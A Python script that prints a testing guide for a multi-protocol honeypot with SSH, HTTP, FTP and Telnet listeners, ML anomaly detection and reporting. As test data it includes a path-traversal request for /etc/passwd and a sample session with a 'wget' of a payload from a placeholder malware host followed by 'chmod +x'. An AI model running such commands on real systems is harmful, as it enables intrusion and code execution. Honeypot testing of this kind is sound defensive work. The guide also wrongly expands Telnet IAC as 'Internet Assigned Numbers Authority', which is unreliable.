#!/usr/bin/env python3
"""
PHANTOMPOT-V2 TESTING GUIDE
Complete instructions to test all features of the honeypot
"""

print("""
╔════════════════════════════════════════════════════════════════════════════╗
║                 PHANTOMPOT-V2 COMPREHENSIVE TESTING GUIDE                  ║
╚════════════════════════════════════════════════════════════════════════════╝

PART 1: SETUP & PREREQUISITES
════════════════════════════════════════════════════════════════════════════

Step 1: Install Dependencies
$ pip install -r requirements.txt

Step 2: Verify SSH Host Key
$ python gen_ssh_key.py
(Only needed if config/ssh_host_rsa.key doesn't exist)

Step 3: Check Configuration
$ cat config/config.yaml
(Verify ports: SSH=2222, HTTP=8888, FTP=2121, Telnet=2323)


PART 2: START THE HONEYPOT (MAIN SERVER)
════════════════════════════════════════════════════════════════════════════

In Terminal 1:
$ python src/main.py

Expected Output:
  [*] PhantomPot — multi-protocol honeypot starting …
  [*] Press Ctrl-C to stop all listeners.
  
  [+] SSH honeypot listening on 0.0.0.0:2222
  [+] FTP honeypot listening on 0.0.0.0:2121
  [+] Telnet honeypot listening on 0.0.0.0:2323
  [*] HTTP honeypot listening on 0.0.0.0:8888


PART 3: TEST EACH PROTOCOL
════════════════════════════════════════════════════════════════════════════

Each test should be run in a SEPARATE TERMINAL while the honeypot is running.


3A. TEST SSH HONEYPOT (Port 2222)
──────────────────────────────────────────────────────────────────────────────

In Terminal 2:
$ ssh admin@localhost -p 2222

When prompted:
- Password: anything (honeypot accepts all credentials)

Once connected, test commands:
admin@honeypot:~$ whoami
admin@honeypot:~$ ls
admin@honeypot:~$ pwd
admin@honeypot:~$ cd /etc
admin@honeypot:/etc$ id
admin@honeypot:/etc$ hostname
admin@honeypot:/etc$ date
admin@honeypot:/etc$ echo "test string"
admin@honeypot:/etc$ exit

Expected Behavior:
✓ Accepts any username/password
✓ Shows dynamic prompts (admin@honeypot:/etc$)
✓ Commands return fake responses
✓ Logs all activity to logs/sessions.jsonl


3B. TEST HTTP HONEYPOT (Port 8888)
──────────────────────────────────────────────────────────────────────────────

In Terminal 2, test with curl:

GET Request:
$ curl http://localhost:8888/

Login Attempt (Credential Capture):
$ curl -X POST http://localhost:8888/login \\
  -H "Content-Type: application/json" \\
  -d '{"username":"admin","password":"password123"}'

Attack Pattern Test:
$ curl "http://localhost:8888/../../../etc/passwd"

Expected Behavior:
✓ Accepts GET/POST requests
✓ Returns JSON responses
✓ Captures credentials from /login endpoints
✓ Detects path traversal attacks
✓ Logs HTTP requests to logs/sessions.jsonl


3C. TEST FTP HONEYPOT (Port 2121)
──────────────────────────────────────────────────────────────────────────────

In Terminal 2:
$ ftp localhost 2121

Or use curl:
$ curl -u admin:password ftp://localhost:2121/

Or Python:
$ python -c "
import ftplib
ftp = ftplib.FTP('localhost', 2121)
ftp.login('admin', 'password')
ftp.sendcmd('SYST')
ftp.quit()
"

Expected Behavior:
✓ Accepts FTP connections
✓ Accepts any username/password
✓ Returns fake responses to commands
✓ Logs all activities
✓ Logs FTP commands (SYST, FEAT, NOOP, TYPE, PASV, PORT)


3D. TEST TELNET HONEYPOT (Port 2323)
──────────────────────────────────────────────────────────────────────────────

In Terminal 2:
$ telnet localhost 2323

When prompted:
- login: admin (any username)
- Password: password123 (any password)

Once connected, test commands:
admin@honeypot:~$ whoami
admin@honeypot:~$ id
admin@honeypot:~$ pwd
admin@honeypot:~$ exit

Expected Behavior:
✓ Accepts any username/password
✓ Shows fake shell prompts
✓ Handles IAC (Internet Assigned Numbers Authority) protocol
✓ Returns fake responses
✓ Logs all activity


PART 4: VERIFY SESSION LOGGING
════════════════════════════════════════════════════════════════════════════

Check that all sessions are being logged:

$ cat logs/sessions.jsonl | python -m json.tool | head -50

Expected Output:
- JSON objects with session information
- Fields: session_id, protocol, source_ip, timestamp, commands, login_attempts
- One complete session per line

Or check errors:
$ cat logs/errors.log


PART 5: TEST ML ANOMALY DETECTION
════════════════════════════════════════════════════════════════════════════

Run the KPI evaluation script (this simulates attacks and measures detection):

In Terminal 2:
$ python scripts/evaluate_objective4.py --intensity medium --output eval_report.json

This will:
✓ Simulate 25 different attack scenarios
✓ Measure detection accuracy
✓ Test all 4 protocols
✓ Calculate KPI metrics
✓ Save results to eval_report.json

View results:
$ cat eval_report.json | python -m json.tool

Expected Output:
- Detection Rate (% of attacks correctly identified)
- Protocol Coverage (4/4 protocols active)
- Logging Accuracy (% of events logged)
- Response Time (milliseconds)


PART 6: VIEW THE DASHBOARD
════════════════════════════════════════════════════════════════════════════

Start the Streamlit dashboard:

In Terminal 2:
$ streamlit run dashboard/app.py

Expected Output:
  You can now view your Streamlit app in your browser.
  
  Local URL: http://localhost:8501
  Network URL: http://<your-ip>:8501

Open http://localhost:8501 in your browser and explore:
✓ Real-time session monitoring
✓ Protocol breakdown charts
✓ Anomaly detection visualizations
✓ KPI metrics dashboard
✓ Session details and filters


PART 7: GENERATE KPI REPORTS
════════════════════════════════════════════════════════════════════════════

Create comprehensive reports in multiple formats:

In Terminal 2:
$ python scripts/generate_kpi_report.py \\
  --eval eval_report.json \\
  --format all

This creates 3 report files:
- objective4_report-TIMESTAMP.json  (machine-readable)
- objective4_report-TIMESTAMP.md    (documentation)
- objective4_report-TIMESTAMP.html  (visual report)

View the reports:
$ ls -lh objective4_report-*.* 


PART 8: TEST ATTACK SIMULATION
════════════════════════════════════════════════════════════════════════════

Simulate SSH attacks:

In Terminal 2:
$ python scripts/simulate_ssh_attacks.py

Simulate multi-protocol attacks:
$ python scripts/simulate_multi_protocol.py

These scripts will:
✓ Generate realistic attack patterns
✓ Test command classification
✓ Verify ML detection
✓ Log all activities to logs/sessions.jsonl


PART 9: VERIFY FEATURE EXTRACTION & ML PREDICTION
════════════════════════════════════════════════════════════════════════════

Test the ML pipeline directly:

$ python -c "
import sys
import json
sys.path.insert(0, 'src')

from core.feature_builder import FeatureBuilder
from ml.predict import predict_session_anomaly

# Create a test session payload
test_session = {
    'session_id': 'test-001',
    'protocol': 'ssh',
    'source_ip': '192.168.1.100',
    'timestamp_start': '2025-04-14T10:00:00Z',
    'timestamp_end': '2025-04-14T10:00:05Z',
    'login_attempts': [
        {'username': 'admin', 'password': 'pass123', 'success': True}
    ],
    'commands': [
        {'command': 'wget http://malware.com/payload', 'is_suspicious': True},
        {'command': 'chmod +x /tmp/payload', 'is_suspicious': True}
    ]
}

# Build features
features = FeatureBuilder.build(test_session)
print('Features:', json.dumps(features, indent=2))

# Predict
prediction = predict_session_anomaly(features)
print('Prediction:', json.dumps(prediction, indent=2))
"

Expected Output:
✓ Features extracted correctly
✓ ML model makes prediction
✓ Returns anomaly score and severity classification


PART 10: QUICK INTEGRATION TEST
════════════════════════════════════════════════════════════════════════════

Run the automated integration test:

$ python test_startup.py

Expected Output:
  ✓ SSH on port 2222
  ✓ HTTP on port 8888
  ✓ FTP on port 2121
  ✓ Telnet on port 2323


PART 11: CHECK PROJECT STRUCTURE
════════════════════════════════════════════════════════════════════════════

Verify all critical files exist:

$ python check_project_status.py

Expected Output:
✓ All objectives COMPLETE
✓ All protocol files present
✓ ML components present
✓ KPI framework present
✓ All imports working


PART 12: ADVANCED: STRESS TEST WITH CONCURRENT CONNECTIONS
════════════════════════════════════════════════════════════════════════════

Test system under load:

$ python -c "
import socket
import threading
import time

def connect_ssh(port=2222):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('localhost', port))
        s.recv(1024)  # Receive SSH banner
        s.close()
        return True
    except:
        return False

# Create 10 concurrent SSH connections
threads = []
for i in range(10):
    t = threading.Thread(target=lambda: connect_ssh())
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print('✓ Stress test completed')
"


═ SUMMARY OF EXPECTED RESULTS
════════════════════════════════════════════════════════════════════════════

After completing all tests, you should have:

✓ All 4 honeypots accepting connections
✓ All 4 protocols logging sessions to logs/sessions.jsonl
✓ SSH with 20 shell commands working
✓ HTTP detecting 25+ attack patterns
✓ FTP logging all commands
✓ Telnet with proper prompts
✓ ML anomaly detection working
✓ Dashboard operational
✓ KPI metrics calculated
✓ Reports generated
✓ System handling concurrent connections

═ TROUBLESHOOTING
════════════════════════════════════════════════════════════════════════════

Issue: "Connection refused"
Fix: Ensure honeypot is running: python src/main.py

Issue: "ModuleNotFoundError"
Fix: Install dependencies: pip install -r requirements.txt

Issue: "Port already in use"
Fix: Change port in config/config.yaml or kill process: lsof -i :PORT

Issue: "SSH key not found"
Fix: Generate key: python gen_ssh_key.py

Issue: "No logs in sessions.jsonl"
Fix: Check logs/errors.log for error messages

═ NEXT STEPS
════════════════════════════════════════════════════════════════════════════

1. Run all tests in sequence
2. Review logs/sessions.jsonl for captured data
3. Test with real attack tools (Metasploit, Burp Suite, etc.)
4. Deploy to production environment
5. Monitor using SIEM tool of choice
6. Collect metrics and improve detection

═ PROJECT COMPLETE ✅
════════════════════════════════════════════════════════════════════════════

All 4 objectives fully implemented and tested.
Ready for security research and threat intelligence gathering.

""")
